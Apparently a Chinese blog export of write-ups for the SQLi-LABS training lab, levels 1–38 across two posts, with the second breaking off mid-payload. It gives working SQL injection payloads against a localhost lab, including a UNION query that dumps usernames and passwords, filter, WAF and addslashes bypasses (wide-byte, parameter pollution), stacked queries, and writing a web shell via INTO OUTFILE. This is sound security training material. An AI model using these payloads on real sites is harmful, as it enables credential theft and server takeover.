href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050744454.png" alt></p><p>id=0,等于-1的话负号被过滤掉还是会显示union前面的数据，不会显示后面的数据。用where ‘1’=’1’闭合后面的双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27/?id=0&apos;%a0UnIon%a0SeLect%a01,group_concat(username,password,0x3a),3%a0from%a0users%a0where%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050924299.png" alt></p><h2 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h2><p>这个跟less 27的区别是不会显示报错语句，还是个双引号闭合方式。所以关键的是去确认他的闭合方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure></p><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。当我们用单引号闭合的时候显示的是正确的</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327050957810.png" alt></p><p>and 1=0依然显示正确，说明不是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051004510.png" alt></p><p>而and 1=1双引号显示正确，and 1=0双引号显示错误。初步确定是双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051021350.png" alt></p><p>基本可以确定是双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051029149.png" alt></p><p>其他操作同less 27</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051039633.png" alt></p><h2 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。<br>基本可以确定是(‘变量’)闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051144949.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051155272.png" alt></p><h2 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出都没有被过滤。然后就是判断闭合方式。<br>不是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051315303.png" alt></p><p>也不是双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051322449.png" alt></p><p>是(‘闭合’)</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051334731.png" alt></p><p>语句发现报错</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051342389.png" alt></p><p>发现union select中间有空格会被过滤掉，其他语句没问题</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051352758.png" alt></p><p>在union和select中间加上%a0</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051400636.png" alt></p><p>源码中过滤都被注释了，我们把注释除去。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051408056.png" alt></p><p>然后还是老方法，发现过滤了select，并且大小写也绕不过去了，没有过滤union，过滤了注释，没有过滤单引号。过滤了空格，并且初步判断为单引号闭合。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051424895.png" alt></p><p>select无法绕过，union也起不了作用，又不会显示报错信息，那么只能用盲注。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051433593.png" alt></p><h2 id="Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application基于WAF的一个错误"><a href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application基于WAF的一个错误" class="headerlink" title="Less-29 GET-Error based- IMPIDENCE MISMATCH-Having a WAF in front of web application基于WAF的一个错误"></a>Less-29 GET-Error based- IMPIDENCE MISMATCH-Having a WAF in front of web application基于WAF的一个错误</h2><p>单引号报错发现是单引号闭合,没有过滤注释，空格，引号，unsion，select，and，or</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051505107.png" alt></p><p>在源文件夹中发现了login.php，发现什么闭合方式都不行，可是源代码中是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051514842.png" alt></p><p><a href="http://secsky.sinaapp.com/216.html" target="_blank" rel="noopener">WAF</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/77758824" target="_blank" rel="noopener">MYSQL注入天书之服务器（两层）架构</a></p><p>在SQL注入过程中主流的WAF绕过技术：</p><p>1.转换特征字符大小写<br>2.利用注释绕过<br>3.编码特征字符绕过<br>4.分隔重写特征字符绕过<br>5.利用截断字符绕过<br>6.变换变量位置绕过<br>7.针对域名保护的绕近<br>8.超大数据包绕过<br>9.转换数据提交方式绕过<br>10.HPP（HTTP参数污染）绕过</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051701789.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&amp;id=2</span><br></pre></td></tr></table></figure></p><p>Explain：apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。</p><p>Tomcat功能类似一个WAF<br>所以我们要传入两个id，第一个用来欺骗waf，第二个用来传送给apache。waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面。</p><p>发现是单引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051822896.png" alt></p><p>绕过WAF注入什么的就比较简单了</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051830649.png" alt></p><h2 id="Less-30-基于错误的GET型双引号字符型注入"><a href="#Less-30-基于错误的GET型双引号字符型注入" class="headerlink" title="Less-30 基于错误的GET型双引号字符型注入"></a>Less-30 基于错误的GET型双引号字符型注入</h2><p>跟less 29一样，单引号变成双引号</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051845531.png" alt></p><h2 id="Less-31-Protection-with-WAF用WAF防护"><a href="#Less-31-Protection-with-WAF用WAF防护" class="headerlink" title="Less - 31 Protection with WAF用WAF防护"></a>Less - 31 Protection with WAF用WAF防护</h2><p>根据报错知道是(“变量”)闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051900005.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051919882.png" alt></p><h2 id="Less-32-Bypass-addslashes-绕过addslashes"><a href="#Less-32-Bypass-addslashes-绕过addslashes" class="headerlink" title="Less - 32 Bypass addslashes()绕过addslashes"></a>Less - 32 Bypass addslashes()绕过addslashes</h2><p>单引号双引号都不会报错 应该是被转义了，用宽字节注入%df’报错</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327051919882.png" alt></p><p>发现是单引号闭合。联合查询</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327052029383.png" alt></p><p>addslashes函数单引号，双引号，反斜杠 均被添加斜线<br>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为\’ 。</p><p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：1. %df吃掉 \ 具体的原因是urlencode(‘) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。2. 将 ‘ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p><h2 id="Less-33-Bypass-addslashes-绕过-addslashes"><a href="#Less-33-Bypass-addslashes-绕过-addslashes" class="headerlink" title="Less - 33 Bypass addslashes()绕过 addslashes()"></a>Less - 33 Bypass addslashes()绕过 addslashes()</h2><p>跟less-32没什么区别</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327052114500.png" alt></p><p>less-32的函数</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327052136120.png" alt></p><p>less-33的函数</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327052203596.png" alt></p><h2 id="Less-34-Bypass-Add-SLASHES（第34节：绕过添加斜杠）"><a href="#Less-34-Bypass-Add-SLASHES（第34节：绕过添加斜杠）" class="headerlink" title="Less - 34 Bypass Add SLASHES（第34节：绕过添加斜杠）"></a>Less - 34 Bypass Add SLASHES（第34节：绕过添加斜杠）</h2><p>各种姿势都绕不过去</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327052215814.png" alt></p><p>应该还是单引号双引号反斜杠被转义了。<br>这里是post型的注入漏洞，同样的也是将post过来的内容进行了’的处理。同样要把\给吃掉。而get型的方式我们是以url形式提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中。将utf-8转换为utf-16或utf-32，例如将 ‘ 转为utf-16为’ 。其实就是把在get提交的%df’经过URLencode后变成’直接复制到post中使用。</p><p><a href="http://www.cnblogs.com/chevin/p/8421349.html" target="_blank" rel="noopener">关于编码：Unicode/UTF-8/UTF-16/UTF-32</a></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053148975.png" alt></p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>根据报错发现单引号被转义了,还是个数字型注入,根本不需要闭合</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053202816.png" alt></p><p>那就比较好办了</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053212971.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053227221.png" alt></p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>id=1’,1”,单引号双引号同样被转义了。同样用宽字节注入</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053242028.png" alt></p><p>根据报错发现是单引号闭合，跟前面的没什么区别</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053253350.png" alt></p><p>看源代码用了一个函数<code>mysql_real_escape_string()</code></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053302602.png" alt></p><p><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string</a>会转义如下字符</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053414638.png" alt></p><p>转义成功返回这些字符串，失败返回false。</p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less -37"></a>Less -37</h2><p>跟less 34一样，只是过滤函数不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053448874.png" alt></p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>单引号报错，发现是单引号闭合，而且不会转义单引号</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053502763.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053509028.png" alt></p><p>发现有点简单就看一下源代码，发现</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053516394.png" alt></p><p><a href="http://www.runoob.com/php/func-mysqli-more-results.html" target="_blank" rel="noopener">PHP mysqli_more_results() 函数</a><br><a href="http://www.runoob.com/php/func-mysqli-multi-query.html" target="_blank" rel="noopener">PHP mysqli_multi_query() 函数</a><br><a href="http://php.net/manual/zh/mysqli.store-result.php" target="_blank" rel="noopener">mysqli_store_result</a><br><a href="http://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">堆叠注入（Stacked injections）</a></p><p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><p>总的来说就是mysqli_mylti_query()这个函数可以执行用；分隔的多条语句。</p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053801277.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_2/20190327053811553.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-LABS 学习SQL注入1</title>
      <link href="/2018/06/01/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5_1/"/>
      <url>/2018/06/01/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5_1/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 1-less 22)<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET和POST的区别及get和post关于请求的编解码的问题</span><br><span class="line">GET请求中对MySQL的注释：-- ，--+</span><br><span class="line">POST请求对MySQL的注释：-- ，#</span><br><span class="line">注意:--后面必须跟空格，一般可以写--空格+字母 如：-- k来进行注释</span><br></pre></td></tr></table></figure><p><img src="/SQLi-LABS-学习SQL注入_1/20190327120806503.png" alt></p><h2 id="less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h2><p>先id=1’，发现报错</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125014669.png" alt></p><p>分析’’1’’ LIMIT 0,1’，除去首尾两个自动加上的单引号可以猜测出来是单引号闭合。</p><p>接下来是猜字段：</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125034524.png" alt></p><p>到order by 4之后报错说明select 语句只有3个查询字段</p><p>也可以用union来判断select语句有几个查询字段</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125047261.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125057959.png" alt></p><p>可为什么union 后面的select 1,2,3没有出现其中的两个数据</p><p><img src="/SQLi-LABS-学习SQL注入_1/图片.png.png" alt="图片.png"></p><p>并且在命令行中是可以查询到两行的</p><p>看一下源码，可以看到函数<code>mysql_fetch_array</code>只被调用了一次，而<code>mysql_fetch_array()</code> 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，具体看你第二个参数是什么，所以这里无论怎么折腾最后只会出来第一行的查询结果。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125130035.png" alt></p><p>如果要把结果集的所有行都取出来，需要用到while循环，看下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while ($row = mysql_fetch_array($result)) &#123;  </span><br><span class="line">    echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;  </span><br><span class="line">    echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];  </span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">    echo &apos;Your Password:&apos; .$row[&apos;password&apos;];  </span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以只要让union前面的语句查询结果为空，那么后面的select语句查询的结果就会显示出来。这个id他一般传的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125152211.png" alt></p><p>下面就要开始真正查询数据库的信息了，可以看到只有第二列和第三列显示在网页上，所以我们只能用这两个位置，但是两个位置是不够的。这时候需要用到数据库的连接函数concat或者concat_ws其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p><p><a href="https://www.2cto.com/database/201202/120705.html" target="_blank" rel="noopener">concat和concat_ws()区别及MySQL的几个实用字符串函数</a></p><p>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125202531.png" alt></p><p>(32是空格的十进制ASCII，58是：的十进制ASCII。)<br>爆出了数据库版本，数据库名字和数据库连接使用的用户名。</p><p>接下来爆数据表的名字</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125216556.png" alt></p><p>这里的<code>0x7365637572697479=security</code>的16进制，因为<code>table_schema=&#39;security&#39;</code>需要用单引号，因为大部分Web应用程序防火墙都过滤了单引号，而转化为16进制之后就可以突破很多防火墙及防注入程序。</p><p>mysql的数据库<code>information_schema</code>，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p><p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p><p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是<code>show columns from schemaname.tablename</code>的结果取之此表。</p><p>[]Mysql数据库information_schema系统表说明(<a href="https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html</a>)</p><p>有了users表名，接下来就要爆字段名，同理可以通过limit把所有的字段名枚举出来，知道了有<code>id，username，password</code></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125300654.png" alt></p><p>然后就可以直接select加枚举爆出所有的<code>id，username，password</code></p><p><img src="/SQLi-LABS-学习SQL注入_1/图片.png1.png" alt="图片.png"></p><h2 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2 GET - Error based - Intiger based (基于错误的GET整型注入)</h2><p>id=1’</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125330634.png" alt></p><p>根据报错可以知道这里是整型注入，变量没有被字符包裹。<br>所以这里不需要单引号，可以直接注释后面的语句，剩余操作同lesson1</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125341593.png" alt></p><h2 id="less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><p>id=1’</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125402134.png" alt></p><p>根据报错可以知道这里是(‘变量’)，所以用’)闭合，后面注释，其他同lesson1步骤即可。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125415438.png" alt></p><p>之后发现id=1”也是不会报错的</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125425481.png" alt></p><p>但是union后面的select语句无效</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125507117.png" alt></p><p>最后发现是由于”没有闭合导致后面的注释不起作用。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125525125.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125507117.png" alt></p><p>可以用and 1=0 和1=1来判断</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125540177.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/图片.png2.png" alt="图片.png"></p><h2 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><p>直接上单引号，发现没有报错，这是因为php中双引号可以包含单引号,那么就让id=1”</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125612908.png" alt></p><p>根据报错可以知道这里是(“变量”)，所以”)闭合，其他同lesson1步骤</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125623279.png" alt></p><h2 id="less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h2><p>id=1’</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125634649.png" alt></p><p>根据报错可以知道这里是单引号闭合，可是即使正常闭合也不会显示数据</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125643463.png" alt></p><p>因为源码中根本就没有输出$row</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125649568.png" alt></p><p>很明显正常是不能够爆出来数据库的内容，所以就要通过报错来显示数据库中的内容。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125657325.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327125705465.png" alt></p><p>有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。（我发现如果没有floor和rand函数也是不会报错的）</p><p><a href="http://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">双查询注入</a></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010120645.png" alt></p><p>由于这里的报错具有随机性，所以如果没有报错需要多提交几次</p><h2 id="less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h2><p>和less5一样，只不过变成了双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010137371.png" alt></p><p>查表</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010144547.png" alt></p><p>查列</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010214934.png" alt></p><p>查数据</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010232536.png" alt></p><h2 id="less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="less 7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>less 7 GET - Dump into outfile - String （导出文件GET字符型注入）</h2><p>导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中<br>使用此漏洞需要知道WEB程序的根路径并且MYSQL的<code>secure-file-priv</code>配置应为可写入该路径</p><p>id=1</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010312438.png" alt></p><p>id=1’发现错误被屏蔽了</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010322431.png" alt></p><p>而且id=1”或者id=1”)都显示正确，所以这里也涉及到了未闭合导致注释失效的问题。<br>但是只有id=1’)) and 1=0报错，所以可以判断出来是单引号加两个括号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010332050.png" alt></p><p>为什么最后的结果在数据库中不为空，是因为<a href="http://www.jb51.net/article/101531.htm" target="_blank" rel="noopener">MySQL的隐式转换</a></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010437721.png" alt></p><p><a href="http://www.jb51.net/article/101531.htm" target="_blank" rel="noopener">MySQL的隐式类型转换整理总结</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 获取安装路径</span><br><span class="line">这里可以通过在less1中获取网站的路径</span><br></pre></td></tr></table></figure></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010725295.png" alt></p><p>可以猜到网站路径<code>E:\tool\PHPstudy\PHPTutorial\WWW</code><br>然后就可以通过使用<code>SELECT...INTO OUTFILE</code>语句导出数据到文本文件上上传一句话木马</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010739592.png" alt></p><p>然后上菜刀</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010749207.png" alt></p><h2 id="less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h2><p>id=1</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010834731.png" alt></p><p>id=1’</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327010852000.png" alt></p><p>没有任何提示，因为它把错误信息隐藏了，所以并不能用显错式注入，只能用盲注。</p><p>详解SQL盲注测试高级技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL盲注的相关函数：</span><br><span class="line">length(str)：返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line">ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select 